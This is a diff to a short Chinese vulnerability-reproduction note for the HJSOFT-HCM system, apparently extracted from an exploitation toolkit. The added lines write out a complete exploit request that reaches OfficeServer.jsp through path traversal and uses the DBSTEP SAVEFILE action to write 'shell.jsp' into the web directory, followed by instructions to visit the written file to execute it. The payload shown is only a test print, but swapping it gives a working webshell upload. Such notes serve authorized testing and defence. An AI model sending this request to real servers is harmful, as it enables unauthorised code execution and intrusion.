@@ -22,13 +22,22 @@ app="HJSOFT-HCM"
 
 ## 漏洞复现
 
+DBSTEP V3.0 协议请求（`OPTION` 字段的 base64 `U0FWRUZJTEU=` 即 `SAVEFILE`）：
+
 ```
 POST /w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp HTTP/1.1
 Content-Type: multipart/form-data; boundary=----
 
-DBSTEP ... SAVEFILE ... FILENAME=...jsp
+DBSTEP V3.0
+OPTION=U0FWRUZJTEU=
+currentUserId=...
+RECOR1DID=...
+FILENAME=shell.jsp
+Content-Disposition: form-data; name="file"; filename="shell.jsp"
+
+<% out.println("test"); %>
 ```
 
-利用 DBSTEP 协议的 SAVEFILE 动作将 JSP 写入 Web 目录后直接访问执行。
+`FILENAME` 指定写入的 JSP 文件名，SAVEFILE 动作将其写入 Web 目录；上传成功响应包含成功标识，随后访问写入路径即可执行。工具 PoC 中上传失败/成功分别有明确回显判断（"webshell上传成功"）。
 
 > 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
